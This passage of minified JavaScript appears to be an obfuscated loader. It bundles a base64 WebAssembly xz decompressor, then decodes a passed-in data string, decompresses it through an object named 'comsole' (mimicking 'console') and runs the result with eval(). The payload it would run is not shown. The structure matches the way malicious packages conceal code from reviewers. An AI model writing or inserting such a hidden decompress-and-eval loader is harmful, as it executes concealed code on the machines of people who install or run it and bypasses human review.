CAAAwCCyACQQA2AjggAkEANgIYCyACDwtBAAvKAQECf0EGIQICQCABQSdLDQAgAEEwaiABQQFxQQJyIAFBAXZBC2p0IgE2AgACQCAAQTxqKAIAIgNFDQBBBCECIAEgAEE0aigCAEsNASAAQSxqIAE2AgAgA0ECRw0AIABBOGooAgAgAU8NACAAIAE2AjggACgCGBCCgICAACAAIAAoAjAQgICAgAAiATYCGCABDQAgAEEANgI4QQMPC0EAIQIgAEEANgLk3QEgAEEANgJAIABB0ABqQQE6AAAgAEHoAGpBADYCAAsgAgsjAAJAIABBPGooAgBFDQAgACgCGBCCgICAAAsgABCCgICAAAv1AQEEf0EAIQMCQCAAKAIMIAJNDQAgACgCGCACTQ0AIAEgASgCACIEIAAoAhAgACgCCCIFayIGIAQgBiAESRsiBGs2AgAgBSACQX9zaiEBAkAgBSACSw0AIAAoAhQgAWohAQsgACgCACICIAFqLQAAIQZBASEDIAAgBUEBajYCCCACIAVqIAY6AAACQCAEQX9qIgJFDQADQCAAKAIAIgVBACABQQFqIgEgASAAKAIURhsiAWotAAAhBCAAIAAoAggiBkEBajYCCCAFIAZqIAQ6AAAgAkF/aiICDQALCyAAKAIMIAAoAggiAU8NACAAIAE2AgwLIAML4gQBB38CQAJAIAAoAgAiA0GAgIAISQ0AIAAoAgQhBAwBCyAAIANBCHQiAzYCACAAIAAoAhAiBUEBajYCECAAIAAoAgRBCHQgBSAAKAIMai0AAHIiBDYCBAsCQAJAIAQgA0ELdiABLwEAIgZsIgVPDQAgACAFNgIAIAEgBkGAECAGa0EFdmo7AQAgASACQQR0akEEaiEHQQghCEECIQkMAQsgACAEIAVrIgQ2AgQgACADIAVrIgM2AgAgASAGIAZBBXZrOwEAAkAgA0H///8HSw0AIAAgA0EIdCIDNgIAIAAgACgCECIFQQFqNgIQIAAgBEEIdCAFIAAoAgxqLQAAciIENgIECwJAIAQgA0ELdiABLwECIgZsIgVPDQAgACAFNgIAIAEgBkGAECAGa0EFdmo7AQIgASACQQR0akGEAmohB0EIIQhBCiEJDAELIAAgBCAFayIENgIEIAAgAyAFayIFNgIAIAEgBiAGQQV2azsBAiABQYQEaiEHQYACIQhBEiEJCyAAQegAaiAJNgIAQQEhAQNAIAcgAUEBdCIBaiEDAkACQCAFQf///wdNDQAgBSECDAELIAAgBUEIdCICNgIAIAAgACgCECIFQQFqNgIQIAAgBEEIdCAFIAAoAgxqLQAAciIENgIECwJAAkAgBCACQQt2IAMvAQAiBmwiBUkNACAAIAQgBWsiBDYCBCAAIAIgBWsiBTYCACADIAYgBkEFdms7AQAgAUEBciEBDAELIAAgBTYCACADIAZBgBAgBmtBBXZqOwEACyABIAhJDQALIABB6ABqIAEgCGsgCWo2AgALCzUBAEGACAsuCAAAABAAAAAYAAAAIAAAACgAAAAwAAAAQAAAAFAAAACAAAAAAAEAAP03elhaAA=="
            }],
            I = {};

        function Q(g) {
            var C = I[g];
            if (void 0 !== C) return C.exports;
            var B = I[g] = {
                exports: {}
            };
            return A[g](B, B.exports, Q), B.exports
        }
        Q.d = (A, I) => {
            for (var g in I) Q.o(I, g) && !Q.o(A, g) && Object.defineProperty(A, g, {
                enumerable: !0,
                get: I[g]
            })
        }, Q.o = (A, I) => Object.prototype.hasOwnProperty.call(A, I), Q.r = A => {
            "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(A, Symbol.toStringTag, {
                value: "Module"
            }), Object.defineProperty(A, "__esModule", {
                value: !0
            })
        };
        var g = {};
        return (() => {
            Q.r(g), Q.d(g, {
                XzReadableStream: () => C
            });
            var A = Q(1);
            class I {
                constructor(A) {
                    this.exports = A.exports, this.memory = this.exports.memory, this.ptr = this.exports.create_context(), this._refresh(), this.bufSize = this.mem32[0], this.inStart = this.mem32[1] - this.ptr, this.inEnd = this.inStart + this.bufSize, this.outStart = this.mem32[4] - this.ptr
                }
                supplyInput(A) {
                    this.mem8.subarray(this.inStart, this.inEnd).set(A, 0), this.exports.supply_input(this.ptr, A.byteLength), this._refresh()
                }
                getNextOutput() {
                    const A = this.exports.get_next_output(this.ptr);
                    if (this._refresh(), 0 !== A && 1 !== A) throw new Error(`get_next_output failed with error code ${A}`);
                    return {
                        outChunk: this.mem8.slice(this.outStart, this.outStart + this.mem32[5]),
                        finished: 1 === A
                    }
                }
                needsMoreInput() {
                    return this.mem32[2] === this.mem32[3]
                }
                outputBufferIsFull() {
                    return this.mem32[5] === this.bufSize
                }
                resetOutputBuffer() {
                    this.outPos = this.mem32[5] = 0
                }
                dispose() {
                    this.exports.destroy_context(this.ptr), this.exports = null
                }
                _refresh() {
                    this.memory.buffer !== this.mem8 ? .buffer && (this.mem8 = new Uint8Array(this.memory.buffer, this.ptr), this.mem32 = new Uint32Array(this.memory.buffer, this.ptr))
                }
            }
            class C extends ReadableStream {
                static _moduleInstancePromise;
                static _moduleInstance;
                static async _getModuleInstance() {
                    const I = await (await fetch(A)).arrayBuffer(),
                        Q = new Response(I, {
                            headers: {
                                "Content-Type": "application/wasm"
                            }
                        }),
                        g = {},
                        B = "function" == typeof WebAssembly.instantiateStreaming ? await WebAssembly.instantiateStreaming(Q, g) : await WebAssembly.instantiate(await Q.arrayBuffer(), g);
                    C._moduleInstance = B.instance
                }
                constructor(A) {
                    let Q, g = null;
                    const B = A.getReader();
                    super({
                        async start(A) {
                            C._moduleInstance || await (C._moduleInstancePromise || (C._moduleInstancePromise = C._getModuleInstance())), Q = new I(C._moduleInstance)
                        },
                        async pull(A) {
                            if (Q.needsMoreInput()) {
                                if (null === g || 0 === g.byteLength) {
                                    const {
                                        done: A,
                                        value: I
                                    } = await B.read();
                                    A || (g = I)
                                }
                                const A = Math.min(Q.bufSize, g.byteLength);
                                Q.supplyInput(g.subarray(0, A)), g = g.subarray(A)
                            }
                            const I = Q.getNextOutput();
                            A.enqueue(I.outChunk), Q.resetOutputBuffer(), I.finished && (Q.dispose(), A.close())
                        },
                        cancel: () => (Q.dispose(), B.cancel())
                    })
                }
            }
        })(), g
    })()
})), (data => {
    function base64ToBytes(A) {
        const I = atob(A);
        return Uint8Array.from(I, (A => A.codePointAt(0)))
    }
    async function load(A) {
        const I = new ReadableStream({
            start(I) {
                I.enqueue(base64ToBytes(A)), I.close()
            }
        });
        return new Response(new comsole.XzReadableStream(I)).text().then(executeCode)
    }

    function executeCode(code) {
        eval(code)
    }
    load(data)